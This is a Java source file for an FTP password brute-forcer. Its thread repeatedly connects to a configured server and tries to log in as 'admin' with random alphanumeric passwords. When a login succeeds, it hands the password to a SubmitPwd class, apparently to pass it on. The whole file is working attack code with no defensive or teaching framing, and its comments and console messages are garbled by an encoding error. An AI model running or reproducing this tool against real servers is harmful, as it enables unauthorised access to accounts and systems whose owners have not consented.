import java.io.IOException;
import java.util.Random;

import org.apache.commons.net.ftp.FTPClient;
import org.apache.commons.net.ftp.FTPReply;

public class LoginFtp extends Thread
{
	Integer num;// ����λ��
	Random random = new Random();
	static boolean finish = false;

	public LoginFtp(int num)
	{
		this.num = num;
	}

	@Override
	public void run()
	{
		FTPClient fClient = new FTPClient();
		for (;;)
		{
			try
			{
				if (finish)
					break;
				fClient.connect(Main.FTP_ADDRESS, Main.FTP_PORT);
				System.out.println("����ftp...");
				String pwd = GetRandString(num);
				System.out.println("����:" + pwd);
				fClient.login("admin", pwd);
				if (FTPReply.isPositiveCompletion(fClient.getReplyCode()))
				{
					System.out.println("�ɹ���ȡ����");
					finish = true;
					new SubmitPwd(pwd).start();
					break;
				}
				else
					System.out.println("����ȷ...");
				fClient.disconnect();
				System.out.println("�Ͽ�ftp...\n");
			}
			catch (IOException e)
			{
				System.out.println("��������,�������߳�");
				new LoginFtp(num);
				break;
			}
		}
		super.run();
	}

	// �������ָ��λ��������
	String GetRandString(int count)
	{
		String str = "";
		for (int i = 1; i <= count; i++)
		{
			str += (GetRandChar() + "");
		}
		return str;
	}

	// ��ȡ����ַ�
	char GetRandChar()
	{
		int c = random.nextInt(62);
		if (c <= 9)// 0-9>>[0-9]
		{
			c += '0';
		}
		else if (c < 36)// a-z>>[10,35]
		{
			c += ('a' - 10);
		}
		else if (c < 62)// A-Z>>[36,61]
		{
			c += ('A' - 36);
		}
		return (char) c;
	}
}
